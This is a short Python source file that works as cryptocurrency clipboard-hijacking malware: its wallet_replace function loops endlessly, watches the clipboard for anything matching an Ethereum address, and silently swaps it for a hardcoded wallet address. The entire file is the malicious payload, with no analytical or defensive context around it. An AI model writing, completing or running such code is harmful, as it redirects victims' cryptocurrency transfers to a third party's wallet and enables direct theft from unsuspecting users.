import re
import pyperclip
import time


def wallet_replace():

    eth_wallet = "0x11b0460655d3adb495943547dcb99f868c56f3a1"

    while True:
        s = pyperclip.paste()

        if re.match(r'0x[a-fA-F0-9]{40}', s):
            pyperclip.copy(eth_wallet)
